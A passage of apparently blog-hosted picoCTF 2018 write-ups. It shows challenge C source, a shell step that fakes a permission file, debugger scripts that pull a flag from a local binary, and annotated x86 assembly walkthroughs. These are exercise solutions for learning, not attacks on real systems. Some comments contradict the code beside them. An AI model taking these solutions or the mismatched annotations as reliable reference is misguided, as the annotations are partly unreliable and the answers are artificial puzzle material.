    <span style="color:#8be9fd">char</span> permission[<span style="color:#bd93f9">10</span>];
    <span style="color:#8be9fd">int</span> i;
    FILE <span style="color:#ff79c6">*</span> file;


    file <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/flag.txt&#34;</span> , <span style="color:#f1fa8c">&#34;r&#34;</span>);
    <span style="color:#ff79c6">if</span> (file) {
     	<span style="color:#ff79c6">while</span> (fscanf(file, <span style="color:#f1fa8c">&#34;%s&#34;</span>, flag)<span style="color:#ff79c6">!=</span>EOF)
    	fclose(file);
    }

    file <span style="color:#ff79c6">=</span> fopen( <span style="color:#f1fa8c">&#34;./permission.txt&#34;</span> , <span style="color:#f1fa8c">&#34;r&#34;</span>);
    <span style="color:#ff79c6">if</span> (file) {
     	<span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">5</span>; i<span style="color:#ff79c6">++</span>){
            fscanf(file, <span style="color:#f1fa8c">&#34;%s&#34;</span>, permission);
        }
        permission[<span style="color:#bd93f9">5</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
        fclose(file);
    }

    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>strncmp(permission, yes, yes_len)) {
        printf(<span style="color:#f1fa8c">&#34;You have the write permissions.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, flag);
    } <span style="color:#ff79c6">else</span> {
         printf(<span style="color:#f1fa8c">&#34;You do not have sufficient permissions to view the flag.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
    }

    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>To solve this challenge, I found a location where I have the write privileges,</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">cd</span> ~
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;yes&#39;</span> &gt; permissions.txt
/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/absolutely-relative
</code></pre></td></tr></table>
</div>
</div><h2 id="in-out-error">in-out-error</h2>
<blockquote>
<p>echo &ldquo;Please may I have the flag?&rdquo; | ./in-out-error 1&gt;/dev/null</p>
</blockquote>
<h2 id="learn-gdb">learn-gdb</h2>
<p>We can solve this problem with radare2</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> r2pipe
<span style="color:#ff79c6">import</span> re

ELF <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./run&#34;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">debug</span>():
    r2 <span style="color:#ff79c6">=</span> r2pipe<span style="color:#ff79c6">.</span>open(ELF)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;ood&#34;</span>)               <span style="color:#6272a4">#reopen in debug mode</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;dc&#34;</span>)                <span style="color:#6272a4">#continue</span>
    <span style="color:#ff79c6">return</span> r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;pxr 32 @ obj.flag_buf&#34;</span>)  <span style="color:#6272a4">#print 32bytes at the address referenced by flag_buf pointer</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">debug2</span>():
    r2 <span style="color:#ff79c6">=</span> r2pipe<span style="color:#ff79c6">.</span>open(ELF, flags<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;-d&#39;</span>])     <span style="color:#6272a4">#debug mode</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;dc&#34;</span>)                            <span style="color:#6272a4">#continue</span>
    address <span style="color:#ff79c6">=</span> r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;pv8 @ obj.flag_buf&#34;</span>)  <span style="color:#6272a4">#print address pointed by flag_buf pointer</span>
    <span style="color:#ff79c6">return</span> r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;ps @ &#39;</span><span style="color:#ff79c6">+</span>address)          <span style="color:#6272a4">#print value contained at this address</span>

<span style="color:#8be9fd;font-style:italic">print</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,debug())[<span style="color:#bd93f9">0</span>]
</code></pre></td></tr></table>
</div>
</div><p>We can also solve this problem with gdb</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> pwn

<span style="color:#6272a4">#run from within TMUX or specify a terminal emulator</span>
<span style="color:#6272a4">#pwn.context.update(terminal=&lt;TERMINAL_EMULATOR&gt;)</span>
BINARY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;./run&#39;</span>

gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
</span><span style="color:#f1fa8c">b decrypt_flag
</span><span style="color:#f1fa8c">c
</span><span style="color:#f1fa8c">printf &#34;Flag </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#34;, (char *)flag_buf
</span><span style="color:#f1fa8c">call printf(&#34;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#34;, (char *)flag_buf) #allows us to call printf from within gdb, and send output to STDOUT
</span><span style="color:#f1fa8c">q
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>

p <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug(BINARY, gdbscript)
<span style="color:#8be9fd;font-style:italic">print</span> p<span style="color:#ff79c6">.</span>recvall()                   <span style="color:#6272a4">#will capture the flag from STDOUT</span>
p<span style="color:#ff79c6">.</span>wait()

<span style="color:#6272a4">#Also valid:</span>
<span style="color:#6272a4">#b * main+65</span>
<span style="color:#6272a4">#b * 0x.......</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="roulette">roulette</h2>
<p>The service is vulnerable to <code>Integer overflow</code></p>
<ul>
<li><strong>solution</strong>: <a href="roulette.py">roulette.py</a></li>
</ul>
<h2 id="store">store</h2>
<h2 id="script-me">script-me</h2>
<h2 id="dog-or-frog">dog-or-frog</h2>
]]></content></item><item><title>picoCTF 2018 - Reversing</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-reversing/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-reversing/</guid><description>Recommended resources: Assembler tutorial Register Calling conventions common-x86-calling-conventions X86_Disassembly/Calling_Conventions Wikipedia x86_64 calling convention assembly-0 The program is called with two arguments: asm0(0xc9, 0xb0), so the stack frame looks like the following: calling convention is cdecl | adress of argument2 | ebp+12 | adress of argument1 | ebp+8 | return address | ebp+4 | old ebp | &amp;lt;--- ebp nasm code source:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 .</description><content type="html"><![CDATA[<h2 id="recommended-resources">Recommended resources:</h2>
<ul>
<li><a href="https://asmtutor.com/">Assembler tutorial</a></li>
<li><a href="https://www.raywenderlich.com/615-assembly-register-calling-convention-tutorial">Register Calling conventions</a></li>
<li><a href="https://lospi.net/assembly/c/developing/software/2015/04/04/common-x86-calling-conventions.html">common-x86-calling-conventions</a></li>
<li><a href="https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions#Standard_C_Calling_Conventions">X86_Disassembly/Calling_Conventions</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">Wikipedia x86_64 calling convention</a></li>
</ul>
<h2 id="assembly-0">assembly-0</h2>
<ul>
<li>The program is called with two arguments: asm0(0xc9, 0xb0), so the stack frame looks like the following:</li>
<li>calling convention is cdecl</li>
</ul>
<pre tabindex="0"><code>| adress of argument2	|	ebp+12
| adress of argument1	|	ebp+8
| return address	|	ebp+4
| old ebp		|  &lt;--- ebp
</code></pre><p>nasm code source:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#50fa7b">.intel_syntax</span> <span style="color:#8be9fd;font-style:italic">noprefix</span>
<span style="color:#50fa7b">.bits</span> <span style="color:#bd93f9">32</span>

<span style="color:#50fa7b">.global</span> <span style="color:#8be9fd;font-style:italic">asm0</span>

<span style="color:#8be9fd;font-style:italic">asm0:</span>
	<span style="color:#50fa7b">push</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>			<span style="color:#6272a4">;prolog</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>,<span style="color:#8be9fd;font-style:italic">esp</span>			<span style="color:#6272a4">;prolog</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]	<span style="color:#6272a4">;eax receives 4 bytes pointing to argument1 which is the value 0xc9</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">ebx</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc</span>] <span style="color:#6272a4">;ebx receives 4 bytes pointing to argument2 which is the value 0xb0</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd;font-style:italic">ebx</span>			<span style="color:#6272a4">;eax is overwritten by ebx</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">esp</span>,<span style="color:#8be9fd;font-style:italic">ebp</span>			<span style="color:#6272a4">;epilog</span>
	<span style="color:#50fa7b">pop</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>			<span style="color:#6272a4">;epilog</span>
	<span style="color:#50fa7b">ret</span>				<span style="color:#6272a4">;epilog</span>
</code></pre></td></tr></table>
</div>
</div><p>mov eax, DWORD PTR [mem]: Get 32-bit value at memory address and store it in eax register: <a href="http://www.c-jump.com/CIS77/ASM/Instructions/I77_0250_ptr_pointer.htm">see here</a></p>
<h2 id="assembly-1">assembly-1</h2>
<p>We call the below asm1(0xc8) which will return 0x29</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#50fa7b">.intel_syntax</span> <span style="color:#8be9fd;font-style:italic">noprefix</span>
<span style="color:#50fa7b">.bits</span> <span style="color:#bd93f9">32</span>

<span style="color:#50fa7b">.global</span> <span style="color:#8be9fd;font-style:italic">asm1</span>

<span style="color:#8be9fd;font-style:italic">asm1:</span>
	<span style="color:#50fa7b">push</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>,<span style="color:#8be9fd;font-style:italic">esp</span>
	<span style="color:#50fa7b">cmp</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x9a</span>	<span style="color:#6272a4">;0xc8 &gt; 0x9a</span>
	<span style="color:#50fa7b">jg</span> 	<span style="color:#8be9fd;font-style:italic">part_a</span>				<span style="color:#6272a4">;JUMP GREATER =&gt; jump to part_a</span>
	<span style="color:#50fa7b">cmp</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x8</span>
	<span style="color:#50fa7b">jne</span>	<span style="color:#8be9fd;font-style:italic">part_b</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]
	<span style="color:#50fa7b">add</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0x3</span>
	<span style="color:#50fa7b">jmp</span>	<span style="color:#8be9fd;font-style:italic">part_d</span>
<span style="color:#8be9fd;font-style:italic">part_a:</span>
	<span style="color:#50fa7b">cmp</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x2c</span>	<span style="color:#6272a4">;0xc8 &gt; 0x2c</span>
	<span style="color:#50fa7b">jne</span>	<span style="color:#8be9fd;font-style:italic">part_c</span>				<span style="color:#6272a4">;JUMP NOT EQUAL =&gt; jump to part_c</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]
	<span style="color:#50fa7b">sub</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0x3</span>
	<span style="color:#50fa7b">jmp</span>	<span style="color:#8be9fd;font-style:italic">part_d</span>
<span style="color:#8be9fd;font-style:italic">part_b:</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]
	<span style="color:#50fa7b">sub</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0x3</span>
	<span style="color:#50fa7b">jmp</span>	<span style="color:#8be9fd;font-style:italic">part_d</span>
	<span style="color:#50fa7b">cmp</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0xc8</span>
	<span style="color:#50fa7b">jne</span>	<span style="color:#8be9fd;font-style:italic">part_c</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]
	<span style="color:#50fa7b">sub</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0x3</span>
	<span style="color:#50fa7b">jmp</span>	<span style="color:#8be9fd;font-style:italic">part_d</span>
<span style="color:#8be9fd;font-style:italic">part_c:</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>]		<span style="color:#6272a4">;eax = 0x2c</span>
	<span style="color:#50fa7b">add</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0x3</span>				<span style="color:#6272a4">;eax = 0x2c - 3 = 0x29</span>
<span style="color:#8be9fd;font-style:italic">part_d:</span>						<span style="color:#6272a4">;epilog</span>
	<span style="color:#50fa7b">pop</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>				<span style="color:#6272a4">;epilog</span>
	<span style="color:#50fa7b">ret</span>					<span style="color:#6272a4">;epilog</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="assembly-2">assembly-2</h2>
<p>We call the below assembly code with arguments asm2(0x8,0x21)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
